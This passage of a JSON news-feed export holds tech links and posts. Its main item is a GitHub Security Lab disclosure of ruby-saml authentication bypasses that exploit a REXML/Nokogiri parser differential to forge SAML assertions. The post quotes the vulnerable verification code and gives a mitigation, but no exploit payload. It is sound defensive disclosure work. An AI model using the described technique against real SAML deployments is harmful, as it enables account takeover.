needed.</p>","contentLength":779,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"duck: disk usage analysis tool with an interactive command line interface","url":"https://www.reddit.com/r/linux/comments/1jc6ipp/duck_disk_usage_analysis_tool_with_an_interactive/","date":1742076733,"author":"/u/KryXus05","guid":749,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/KryXus05\"> /u/KryXus05 </a>","contentLength":31,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"PSA: 🌇 async-std has been officially discontinued; use smol instead","url":"https://crates.io/crates/async-std","date":1742076554,"author":"/u/JoshTriplett","guid":377,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1jc6gis/psa_asyncstd_has_been_officially_discontinued_use/"},{"title":"best way to integrate argocd and hashicorp vault","url":"https://www.reddit.com/r/kubernetes/comments/1jc4ise/best_way_to_integrate_argocd_and_hashicorp_vault/","date":1742070950,"author":"/u/Existing-Mirror2315","guid":372,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/Existing-Mirror2315\"> /u/Existing-Mirror2315 </a>","contentLength":42,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"TracePerf: TypeScript-Powered Node.js Logger That Actually Shows You What's Happening","url":"https://github.com/thelastbackspace/traceperf","date":1742070828,"author":"/u/shubhwadekar","guid":406,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jc4h7d/traceperf_typescriptpowered_nodejs_logger_that/"},{"title":"I implemented my own regex engine in Go","url":"https://github.com/bogdan-deac/regex","date":1742069910,"author":"/u/Constant_Apple_577","guid":363,"unread":true,"content":"<p>Automata theory and formal languages always seemed cool to me, so I decided to implement my own regexes. It's just a toy project but I had a lot of fun doing it so far and I'll see how far I can take it.</p>","contentLength":203,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1jc455b/i_implemented_my_own_regex_engine_in_go/"},{"title":"A Simple Linux Desktop for People with Cognitive Decline – Where to Start?","url":"https://www.reddit.com/r/linux/comments/1jc3mfs/a_simple_linux_desktop_for_people_with_cognitive/","date":1742068545,"author":"/u/Important-Ad2632","guid":380,"unread":true,"content":"<p>I have this idea that might be a bit far-fetched, and even though I’ve used Linux for years, I’m not really sure where to start.</p><p>The Background My dad was diagnosed with dementia over a year ago. While he’s still able to think clearly in many ways, his ability to use technology has taken a hit. He only got into computers and smartphones later in life, and now, with so much of society relying on digital tools—whether it’s banking, doctor appointments, or even just staying in touch—he’s struggling.</p><p>Where I live, we even have a government-issued two-factor authentication device/app that’s required for almost everything. It’s frustrating for him, and I’ve seen firsthand how technology, which should be making life easier, is actually making him feel more isolated. And let’s be real—this reliance on tech is only going to increase.</p><p>The Idea I’d love to create an ultra-simple Linux desktop tailored for people like my dad. Something that: • Boots straight into a locked-down, minimal desktop. • Has only a few essential programs, like a web browser, email client, or video calling app. • Allows relatives to configure everything through an admin panel setting bookmarks, fixing icons, and keeping things simple. • Runs on familiar hardware, since Linux makes it easy to install on existing devices with a USB.</p><p>This would be a passion project. I just see a real need for it, and I’m sure it could help a lot of people.</p><p>My Question I’m not planning on touching kernel code or diving into low-level OS development. I have some programming experience (mostly in data engineering and data science), but I don’t even know where to start researching a project like this. What tools or frameworks should I look into? Are there existing Linux distros or desktop environments that could be adapted for this purpose?</p><p>I know this won’t be ready in time to help my dad, but I’d still love to explore the idea. Any pointers would be appreciated!</p><p>Even if I drop the project along the way I still get to learn something new about Linux </p>","contentLength":2062,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Sign in as anyone: Bypassing SAML SSO authentication with parser differentials","url":"https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/","date":1742065561,"author":"campuscodi","guid":147,"unread":true,"content":"<blockquote><p>Critical authentication bypass vulnerabilities (CVE-2025-25291 + CVE-2025-25292) were discovered in ruby-saml up to version 1.17.0. Attackers who are in possession of a single valid signature that was created with the key used to validate SAML responses or assertions of the targeted organization can use it to construct SAML assertions themselves and are in turn able to log in as any user. In other words, it could be used for an account takeover attack. Users of ruby-saml should update to version 1.18.0. References to libraries making use of ruby-saml (such as omniauth-saml) need also be updated to a version that reference a fixed version of ruby-saml.</p></blockquote><p>In this blog post, we detail newly discovered authentication bypass vulnerabilities in the <a href=\"https://github.com/SAML-Toolkits/ruby-saml\">ruby-saml</a> library used for single sign-on (SSO) via SAML on the service provider (application) side. GitHub doesn’t currently use ruby-saml for authentication, but began evaluating the use of the library with the intention of using an open source library for SAML authentication once more. This library is, however, used in other popular projects and products. We discovered an exploitable instance of this vulnerability in GitLab, and have notified their security team so they can take necessary actions to protect their users against potential attacks.</p><p>GitHub previously used the ruby-saml library up to 2014, but moved to our own SAML implementation due to missing features in ruby-saml at that time. Following bug bounty reports around vulnerabilities in our own implementation (such as <a href=\"https://docs.github.com/en/enterprise-server@3.13/admin/release-notes#3.13.5-security-fixes\">CVE-2024-9487</a>, related to encrypted assertions), GitHub recently decided to explore the use of ruby-saml again. Then in October 2024, a blockbuster vulnerability dropped: an <a href=\"https://github.com/advisories/GHSA-jw9c-mfg7-9rx2\">authentication bypass</a> in ruby-saml (CVE-2024-45409) by <a href=\"https://hackerone.com/ahacker1\">ahacker1</a>. With tangible evidence of exploitable attack surface, GitHub’s switch to ruby-saml had to be evaluated more thoroughly now. As such, GitHub started a <a href=\"https://hackerone.com/github\">private bug bounty engagement</a> to evaluate the security of the ruby-saml library. We gave selected bug bounty researchers access to GitHub test environments using ruby-saml for SAML authentication. In tandem, the GitHub Security Lab also reviewed the attack surface of the ruby-saml library.</p><p>As is not uncommon when multiple researchers are looking at the same code, both ahacker1, a participant in the <a href=\"https://hackerone.com/github\">GitHub bug bounty program</a>, and I noticed the same thing during code review: ruby-saml was using two different XML parsers during the code path of signature verification. Namely, REXML and Nokogiri. While REXML is an XML parser implemented in pure Ruby, Nokogiri provides an easy-to-use wrapper API around different libraries like libxml2, libgumbo and Xerces (used for JRuby). Nokogiri supports parsing of XML and HTML. It looks like Nokogiri was added to ruby-saml to support <a href=\"https://en.wikipedia.org/wiki/Canonical_XML\">canonicalization</a> and potentially other things REXML didn’t support at that time.</p><p>We both inspected the same code path in the <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L268\"></a> of  and found that the signature element to be verified is first read via REXML, and then also with Nokogiri’s XML parser. So, if REXML and Nokogiri could be tricked into retrieving different signature elements for the same XPath query it might be possible to trick ruby-saml into verifying the wrong signature. It looked like there could be a potential authentication bypass due to a !</p><p>The reality was actually more complicated than this.</p><p>Roughly speaking, four stages were involved in the discovery of this authentication bypass:</p><ol><li>Discovering that two different XML parsers are used during code review.  </li><li>Establishing if and how a parser differential could be exploited.  </li><li>Finding an actual parser differential for the parsers in use.  </li><li>Leveraging the parser differential to create a full-blown exploit.</li></ol><p>To prove the security impact of this vulnerability, it was necessary to complete all four stages and create a full-blown authentication bypass exploit.</p><h2>Quick recap: how SAML responses are validated<a href=\"https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/#quick-recap-how-saml-responses-are-validated\" aria-label=\"Quick recap: how SAML responses are validated\"></a></h2><p>Security assertion markup language (<a href=\"https://en.wikipedia.org/wiki/Security_Assertion_Markup_Language\">SAML</a>) responses are used to transport information about a signed-in user from the identity provider (IdP) to the service provider (SP) in XML format. Often the only important information transported is a username or an email address. When the HTTP POST binding is used, the SAML response travels from the IdP to the SP via the browser of the end user. This makes it obvious why there has to be some sort of signature verification in play to prevent the user from tampering with the message.</p><p>Let’s have a quick look at what a simplified SAML response looks like:<img data-recalc-dims=\"1\" decoding=\"async\" loading=\"lazy\" src=\"https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?resize=1024%2C355\" alt=\"A diagram depicting a simplified SAML response on the left and the verification of the digest and the signature on the right.\" width=\"1024\" height=\"355\" srcset=\"https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?w=2632 2632w, https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?w=300 300w, https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?w=768 768w, https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?w=1024 1024w, https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?w=1536 1536w, https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?w=2048 2048w\" sizes=\"auto, (max-width: 1000px) 100vw, 1000px\"></p><p><em>Note: in the response above the XML namespaces were removed for better readability.</em></p><p>As you might have noticed: the main part of a simple SAML response is its assertion element (A), whereas the main information contained in the assertion is the information contained in the  element (B) (here the NameID containing the username: admin). A real assertion typically contains more information (e.g.  and  dates as part of a  element.)</p><p>Normally, the  (A) (without the whole  part) is <a href=\"https://en.wikipedia.org/wiki/Canonical_XML\">canonicalized</a> and then compared against the  (C) and the  (D) is canonicalized and verified against the  (E). In this sample, the assertion of the SAML response is signed, and in other cases the whole SAML response is signed.</p><h2>Searching for parser differentials<a href=\"https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/#searching-for-parser-differentials\" aria-label=\"Searching for parser differentials\"></a></h2><p>We learned that ruby-saml used two different XML parsers (REXML and Nokogiri) for validating the SAML response. Now let’s have a look at the verification of the signature and the digest comparison.\nThe focus of the following explanation lies on the <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L268\"></a> method inside of .</p><p>Inside that method, there’s a broad XPath <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L278C1-L282C8\">query</a> with REXML for the first signature element inside the SAML document:</p><pre><code>sig_element = REXML::XPath.first(\n  @working_copy,\n  \"//ds:Signature\",\n  {\"ds\"=&gt;DSIG}\n)\n</code></pre><p><em>Hint: When reading the code snippets, you can tell the difference between queries for REXML and Nokogiri by looking at how they are called. REXML methods are prefixed with , whereas Nokogiri methods are called on .</em></p><p>Later, the actual  is <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L293C1-L298C92\">read</a> from this element:</p><pre><code>base64_signature = REXML::XPath.first(\n  sig_element,\n  \"./ds:SignatureValue\",\n  {\"ds\" =&gt; DSIG}\n)\nsignature = Base64.decode64(OneLogin::RubySaml::Utils.element_text(base64_signature))\n</code></pre><p>Note: the name of the  element might be a bit confusing. While it contains the actual signature in the  node it also contains the part that is actually signed in the  node. Most importantly the  element contains the digest (hash) of the assertion and information about the used key.</p><p>So, an actual  element could look like this (removed namespace information for better readability):</p><pre><code>&lt;Signature&gt;\n    &lt;SignedInfo&gt;\n        &lt;CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\" /&gt;\n        &lt;SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\" /&gt;\n        &lt;Reference URI=\"#_SAMEID\"&gt;\n            &lt;Transforms&gt;&lt;Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\" /&gt;&lt;/Transforms&gt;\n            &lt;DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\" /&gt;\n            &lt;DigestValue&gt;Su4v[..]&lt;/DigestValue&gt;\n        &lt;/Reference&gt;\n    &lt;/SignedInfo&gt;\n    &lt;SignatureValue&gt;L8/i[..]&lt;/SignatureValue&gt;\n    &lt;KeyInfo&gt;\n        &lt;X509Data&gt;\n            &lt;X509Certificate&gt;MIID[..]&lt;/X509Certificate&gt;\n        &lt;/X509Data&gt;\n    &lt;/KeyInfo&gt;\n&lt;/Signature&gt;\n</code></pre><p>Later in the same method () there’s again a <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L307\">query for the Signature</a>(s)—but this time with Nokogiri.</p><pre><code>noko_sig_element = document.at_xpath('//ds:Signature', 'ds' =&gt; DSIG)\n</code></pre><p>Then the  element is taken from that signature and <a href=\"https://en.wikipedia.org/wiki/Canonical_XML\">canonicalized</a>:</p><pre><code>noko_signed_info_element = noko_sig_element.at_xpath('./ds:SignedInfo', 'ds' =&gt; DSIG)\n\ncanon_string = noko_signed_info_element.canonicalize(canon_algorithm)\n</code></pre><p>Let’s remember this  contains the canonicalized  element.</p><p>The  element is then also <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L314C6-L318C8\">extracted</a> with REXML:</p><pre><code> signed_info_element = REXML::XPath.first(\n        sig_element,\n        \"./ds:SignedInfo\",\n        { \"ds\" =&gt; DSIG }\n )\n</code></pre><p>From this  element the  node is <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L324\">read</a>:</p><pre><code>ref = REXML::XPath.first(signed_info_element, \"./ds:Reference\", {\"ds\"=&gt;DSIG})\n</code></pre><pre><code>reference_nodes = document.xpath(\"//*[@ID=$id]\", nil, { 'id' =&gt; extract_signed_element_id })\n</code></pre><p>The method <code>extract_signed_element_id</code><a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L406C9-L406C34\">extracts</a> the signed element id with help of REXML. From the previous authentication bypass (CVE-2024-45409), there’s now a <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L328\">check</a> that only one element with the same ID can exist.</p><p>The first of the  is taken and canonicalized:</p><pre><code>hashed_element = reference_nodes[0][..]canon_hashed_element = hashed_element.canonicalize(canon_algorithm, inclusive_namespaces)\n</code></pre><p>The  is then <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L349C7-L349C59\">hashed</a>:</p><pre><code>hash = digest_algorithm.digest(canon_hashed_element)\n</code></pre><p>The  to compare it against is then <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L350C7-L355C99\">extracted</a> with REXML:</p><pre><code>encoded_digest_value = REXML::XPath.first(\n        ref,\n        \"./ds:DigestValue\",\n        { \"ds\" =&gt; DSIG }\n      )\ndigest_value = Base64.decode64(OneLogin::RubySaml::Utils.element_text(encoded_digest_value))\n</code></pre><p>Finally, the  (built from the element extracted by Nokogiri) is <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L357\">compared</a> against the  (extracted with REXML):</p><pre><code>unless digests_match?(hash, digest_value)\n</code></pre><p>The  extracted some lines ago (a result of an extraction with Nokogiri) is later <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L366C7-L366C86\">verified against</a> (extracted with REXML).</p><pre><code>unless cert.public_key.verify(signature_algorithm.new, signature, canon_string)\n</code></pre><p>In the end, we have the following constellation:</p><ol><li>The assertion is extracted and canonicalized with Nokogiri, and then hashed. In contrast, the hash against which it will be compared is extracted with REXML.  </li><li>The SignedInfo element is extracted and canonicalized with Nokogiri - it is then verified against the SignatureValue, which was extracted with REXML.</li></ol><h2>Exploiting the parser differential<a href=\"https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/#exploiting-the-parser-differential\" aria-label=\"Exploiting the parser differential\"></a></h2><p>The question is: is it possible to create an XML document where REXML sees one signature and Nokogiri sees another?</p><p>Ahacker1, participating in the bug bounty, was faster to produce a working exploit using a parser differential. Among other things, ahacker1 was inspired by the <a href=\"https://mattermost.com/blog/securing-xml-implementations-across-the-web/\">XML roundtrips vulnerabilities</a> published by Mattermost’s Juho Forsén in 2021.</p><p>Not much later, I produced an exploit using a different parser differential with the help of <a href=\"https://blog.trailofbits.com/2024/03/29/introducing-ruzzy-a-coverage-guided-ruby-fuzzer/\">Trail of Bits’ Ruby fuzzer</a> called ruzzy.</p><p>Both exploits result in an authentication bypass. Meaning that an attacker, who is in possession of a single valid signature that was created with the key used to validate SAML responses or assertions of the targeted organization, can use it to construct assertions for any users which will be accepted by ruby-saml. Such a signature can either come from a signed assertion or response from another (unprivileged) user or in certain cases, it can even come from signed metadata of a SAML identity provider (which can be publicly accessible).</p><p>An exploit could look like this. Here, an additional Signature was added as part of the  element that is only visible to Nokogiri:</p><p>The  element (A) from the signature that is visible to Nokogiri is canonicalized and verified against the  (B) that was extracted from the signature seen by REXML.</p><p>The assertion is retrieved via Nokogiri by looking for its ID. This assertion is then canonicalized and hashed (C). The hash is then compared to the hash contained in the  (D). This DigestValue was retrieved via REXML. This DigestValue has no corresponding signature.</p><p>So, two things take place:</p><ul><li>A valid SignedInfo with DigestValue is verified against a valid signature. (which checks out)  </li><li>A fabricated canonicalized assertion is compared against its calculated digest. (which checks out as well)</li></ul><p>This allows an attacker, who is in possession of a valid signed assertion for any (unprivileged) user, to fabricate assertions and as such impersonate any other user.</p><h3>Check for errors when using Nokogiri<a href=\"https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/#check-for-errors-when-using-nokogiri\" aria-label=\"Check for errors when using Nokogiri\"></a></h3><p>Parts of the currently known, undisclosed exploits can be stopped by checking for Nokogiri parsing errors on SAML responses. Sadly, those errors do not result in exceptions, but need to be checked on the <a href=\"https://www.rubydoc.info/github/sparklemotion/nokogiri/Nokogiri%2FXML%2FDocument:errors\"></a> member of the parsed document:</p><pre><code>doc = Nokogiri::XML(xml) do |config|\n  config.options = Nokogiri::XML::ParseOptions::STRICT | Nokogiri::XML::ParseOptions::NONET\nend\n\nraise \"XML errors when parsing: \" + doc.errors.to_s if doc.errors.any?\n</code></pre><p>While this is far from a perfect fix for the issues at hand, it renders at least one exploit infeasible.</p><p>We are not aware of any reliable indicators of compromise. While we’ve found a potential indicator of compromise, it only works in debug-like environments and to publish it, we would have to reveal too many details about how to implement a working exploit so we’ve decided that it’s better not to publish it. Instead, our best recommendation is to look for suspicious logins via SAML on the service provider side from IP addresses that do not align with the user’s expected location.</p><h2>SAML and XML signatures:as confusing as it gets<a href=\"https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/#saml-and-xml-signaturesas-confusing-as-it-gets\" aria-label=\"SAML and XML signatures:as confusing as it gets\"></a></h2><p>Some might say it’s hard to integrate systems with SAML. That might be true. However, it’s even harder to write implementations of SAML using XML signatures in a secure way. As others have stated before: it’s probably best to <a href=\"https://ssoready.com/blog/engineering/ruby-saml-pwned-by-xml-signature-wrapping-attacks/#how-to-fix-this-disregard-the-spec\">disregard the specifications</a>, as following them doesn’t help build secure implementations.\nTo rehash how the validation works if the SAML assertion is signed, let’s have a look at the graphic below,  depicting a simplified SAML response. The assertion, which transports the protected information, contains a signature. Confusing, right?</p><p>To complicate it even more: What is even signed here? The whole assertion? No!</p><p>What’s signed is the  element and the  element contains a . This  is the hash of the canonicalized assertion with the signature element removed before the canonicalization. This two-stage verification process can lead to implementations that have a disconnect between the verification of the hash and the verification of the signature. This is the case for these Ruby-SAML parser differentials: while the hash and the signature check out on their own, they have no connection. The hash is actually a hash of the assertion, but the signature is a signature of a different  element containing another hash. What you actually want is a direct connection between the hashed content, the hash, and the signature. (And once the verification is done you only want to retrieve information from the exact part that was actually verified.) Or, alternatively, use a less complicated standard to transport a cryptographically signed username between two systems - but here we are.</p><p>In this case, the library already extracted the  and used it to verify the signature of its canonicalized string,. However, it did not use it to obtain the digest value. If the library had used the content of the already extracted  to obtain the digest value, it would have been secure in this case even with two XML parsers in use.</p><p>As shown once again: relying on two different parsers in a security context can be tricky and error-prone. That being said: exploitability is not automatically guaranteed in such cases. As we have seen in this case, checking for Nokogiri errors could not have prevented the parser differential, but could have stopped at least one practical exploitation of it.</p><p>The initial fix for the authentication bypasses does not remove one of the XML parsers to prevent API compatibility problems. As noted, the more fundamental issue was the disconnect between verification of the hash and verification of the signature, which was exploitable via parser differentials. The <a href=\"https://github.com/SAML-Toolkits/ruby-saml/pull/736\">removal of one of the XML</a> parsers was already planned for other reasons, and will likely come as part of a major release in combination with additional improvements to strengthen the library. If your company relies on open source software for business-critical functionality, consider <a href=\"https://github.com/sponsors\">sponsoring</a> them to help fund their future development and bug fix releases.</p><p>If you’re a user of ruby-saml library, make sure to update to the latest version, 1.18.0, containing fixes for <a href=\"https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-4vc4-m8qh-g8jm\">CVE-2025-25291</a> and <a href=\"https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-754f-8gm6-c4r2\">CVE-2025-25292</a>. References to libraries making use of ruby-saml (such as <a href=\"https://github.com/omniauth/omniauth-saml\">omniauth-saml</a>) need also be updated to a version that reference a fixed version of ruby-saml. We will publish a proof of concept exploit at a later date in the <a href=\"https://github.com/github/securitylab\">GitHub Security Lab repository</a>.</p><p>Special thanks to Sixto Martín, maintainer of ruby-saml, and Jeff Guerra from the GitHub Bug Bounty program.\nSpecial thanks also to ahacker1 for giving inputs to this blog post.</p><ul><li>2024-11-04: Bug bounty report demonstrating an authentication bypass was reported against a GitHub test environment evaluating ruby-saml for SAML authentication.  </li><li>2024-11-04: Work started to identify and test potential mitigations.  </li><li>2024-11-12: A second authentication bypass was found by Peter that renders the planned mitigations for the first useless.  </li><li>2024-11-13: Initial contact with Sixto Martín, maintainer of ruby-saml.  </li><li>2024-11-14: Both parser differentials are reported to ruby-saml, the maintainer responds immediately.  </li><li>2024-11-14: The work on potential patches by the maintainer and ahacker1 begins. (One of the initial ideas was to remove one of the XML parsers, but this was not feasible without breaking backwards compatibility).  </li><li>2025-02-04: ahacker1 proposes a non-backwards compatible fix.  </li><li>2025-02-06: ahacker1 also proposes a backwards compatible fix.  </li><li>2025-02-12: The 90 days deadline of GitHub Security Lab advisories ends.  </li><li>2025-02-16: The maintainer starts working on a fix with the idea to be backwards-compatible and easier to understand.  </li><li>2025-02-17: Initial contact with GitLab to coordinate a release of their on-prem product with the release of the ruby-saml library.  </li><li>2025-03-12: A fixed version of ruby-saml was released.</li></ul><div><article><div><div><p>Security Researcher at GitHub Security Lab</p></div></div></article></div>","contentLength":17509,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=43374519"},{"title":"That Time I Recreated Photoshop in C++","url":"https://f055.net/technology/that-time-i/that-time-i-recreated-photoshop-in-c/","date":1742062935,"author":"f055","guid":744,"unread":true,"content":"<div><div><p>As I’m getting older I look back on all the things I’ve done as a creative developer, and I see so many cool projects! But I never wrote down any development stories, and most of these projects, even as successful when released, got lost in time as years go by. That’s why I’m starting my new posts series „That time I” where I look back on my most interesting projects.</p></div></div><p>The first one is about that time I recreated Photoshop in C++ and Windows API! I invite you to read my story and leave a comment with feedback, it’s hard to go on without your input 🙂</p><p>Everything started in early summer of 2006. I was reading *a lot* of manga back then. But all the image reading apps sucked. Specifically, none of the apps allowed me to control my reading using just the mouse, and reaching my keyboard all the time was distracting. Since I just finished the C++/Windows API course at the uni, I spent the summer break coding my perfect manga reader. And I named it <a href=\"https://github.com/f055/fiew-image-viewer\" target=\"_blank\" rel=\"noopener\">Fiew</a>.</p><p>Early autumn 2006 we returned to uni and had to decide on our final thesis for the degree. Writing the image viewer went smooth enough that I got the idea I could create an image editor as well. I was a heavy Adobe Photoshop user back then, so that became my goal. I mean, how hard can it be? Turns out, very.</p><p>Over the course of the next several months, I wrote Advanced Image Editor named Fedit in C++ using Windows API and GDI+ graphic libraries. It followed a set of five rules to benefit the end user: no installers, no archives, no registry keys, no additional runtimes and a single executable file. The result was a program that was ready to work without the need of installation, could be run on systems with limited privileges (or straight from a thumb drive) and consumed small amounts of resources.</p><p>I was very careful to make the interface look like classic Photoshop, and include all my most used features. So you had all the free floating windows with tools. The excellent colour picker. Easy layer management. Step-by-step reversible history. Several image filters, plus a matrix interface to encode your own pixel shifting filters too.</p><p>Straight from my previous project named Fiew I added a massive image library viewer. It really could quickly and easily scroll through massive amounts of pictures.</p><p>I had a lot of fun coding Fedit. And a lot of issues along the way. I spent a ton of time on MSDN and Stack Overflow, however that didn’t help that much since most of the issues were so specific I had to analyse and debug them on my own. But I worked like crazy on it, my motivation was immense. I had to make the bachelor thesis deadline, so for the final two-month stint I worked 14 hours a day.</p><p>User interface was the most tricky bit. I wanted the workflow to resemble Photoshop as much as possible. The freely snapping-unsnapping of the tool settings pane was particularly hard. But no less than recreating the colour picker or the tool selector.</p><p>By the time I finished I was pretty exhausted and kind of resenting WinAPI. But the thesis was a success and I received my Bachelor of Science in Engineering from the Warsaw University of Technology. Fedit received several positive reviews online but I didn’t promote it. Instead I took a well deserved holiday. A few months later thanks to the impression Fiew and Fedit made on the CTO of GoldenLine (Polish LinkedIn, market leader in its time, but now defunct), I landed a C++ job with a task to create extremely efficient WinAPI app to handle massive image uploading for a clone of Flickr. So in the end all that effort paid off.</p><p>Fedit (and Fiew) source code is available on <a href=\"https://github.com/f055/fedit-image-editor\" target=\"_blank\" rel=\"noopener\">GitHub</a>. The thesis documentation is available as <a href=\"https://f055.net/wp-content/uploads/files/Thesis-Fedit.pdf\">PDF</a>. The original website for these apps is still up on the <a href=\"https://web.archive.org/web/20140517125711/http://fapplication.org/\" target=\"_blank\" rel=\"noopener\">Web Archive</a>!</p>","contentLength":3735,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=43374278"},{"title":"My 6 months with the GoTH stack: building front-ends with Go, HTML and a little duct tape","url":"https://open.substack.com/pub/thefridaydeploy/p/my-6-months-with-the-goth-stack-building?r=36rml&amp;utm_campaign=post&amp;utm_medium=web&amp;showWelcomeOnShare=true","date":1742061490,"author":"/u/theothertomelliott","guid":364,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1jc0zby/my_6_months_with_the_goth_stack_building/"},{"title":"Thinking like a Staff Engineer at Big Tech with Sean Goedecke","url":"https://newsletter.techworld-with-milan.com/p/thinking-like-a-staff-engineer-at","date":1742059014,"author":"/u/milanm08","guid":718,"unread":true,"content":"<p>Here’s a glimpse of what we cover:</p><ul><li><p><strong>Key lessons in shipping large-scale projects and why keeping leadership informed matters</strong></p></li><li><p><strong>Balancing top-notch technical skills with selective soft-skill usage</strong></p></li><li><p><strong>Strategies for standing out in high-stakes company initiatives</strong></p></li><li><p><strong>The trade-offs behind key architectural decisions in SaaS development</strong></p></li><li><p><strong>Navigating career growth and promotions in remote or distributed teams</strong></p></li></ul><p>If you aim for a more significant impact in your engineering career, you’ll find much to explore in this conversation. </p><p><em><a href=\"https://www.semasoftware.com/\" rel=\"\">Sema</a></em></p><p><em>We’ve taken everything we’ve learned to build a SaaS product to help Engineering leaders.</em></p><p><em>Specifically, there are three modules ready in the MVP:</em></p><ul><li><p><em>to explain the level of tech debt to less technical audiences</em></p></li><li><p><em>to understand if the product roadmap is on track (with minimal setup!)</em></p></li><li><p><em>to manage GenAI coding usage to team-preferred levels</em></p></li></ul><p><em><strong>offering a $50 e-gift card for 15 minutes of feedback on the product.</strong></em></p><p>I’m a software engineer at GitHub, working on various AI products. I’ve been in the industry for about ten years, almost entirely at sizeable American tech companies doing what I would call standard SaaS web development. I don’t have a traditional computer science background. I have a degree in mathematics and an MA in moral philosophy, which set me up pretty well for the kind of careful, rigorous thinking you need to do in this business.</p><p><strong>Over five years, I worked my way up to a staff engineer role, then changed jobs to GitHub</strong></p><p>I live in Australia, but my manager and half my team are based in America, so I have a work environment spread across time zones (and cultures!), which can be pretty interesting. And a personal fact: I have two greyhounds, Daisy and Ringo, who I love wholeheartedly.</p><p><strong>being very intentional about your goals</strong><strong>figure out what gets people promoted to staff+ at your company</strong></p><p><strong>work on projects that were important to the company</strong></p><p><strong>I’m good at getting projects over the line</strong></p><p><strong>everything feels like a giant mess, and almost nobody understands end-to-end what’s going on.</strong></p><p><strong>There are many ways to be a successful staff engineer</strong><strong>The most important technical skill is fitting lots of context in your head (cognitive load)</strong></p><p><strong>If you’re leading the project</strong><strong>it’s your job to grasp the big picture</strong></p><p><strong>very comfortable with relational databases, have a good intuitive understanding of HTTP and whatever server architecture your main app is using</strong><strong>and enough frontend to be able to fix bugs and build new UI</strong></p><p><strong>being very selective about what battles I pick</strong></p><p>Other critical soft skills:</p><ul><li><p><strong>Writing short updates and work summaries</strong></p></li><li><p><strong>Bridging the gap between technical and non-technical communicators</strong></p></li><li><p><strong>Reassuring people who are panicking about the state of the project</strong></p></li></ul><p><strong>Soft skills are more critical at the staff level than other levels, but I don’t think they’re more vital than technical skills.</strong></p><p><strong>. When your skip-level manager changes, you have to start building that relationship up all over again</strong></p><p><strong>taking full advantage of your skip-level 1:1s in this situation.</strong></p><p><strong>towering internal confidence that they can dig in and work out when faced with a tricky problem</strong></p><p><strong>I read the official company goal</strong><strong>many engineers don’t even do that.</strong><em>What’s top-of-mind for you right now?</em></p><p><strong>I also try to pay attention to the vibes</strong></p><p><strong>I try not to have too many of my own goals in a high-priority project.</strong></p><p><strong>how metrics will lie to you, why understanding the system end-to-end is critical to understanding the problem, and so on.</strong></p><p><strong> that how your code runs in production is your 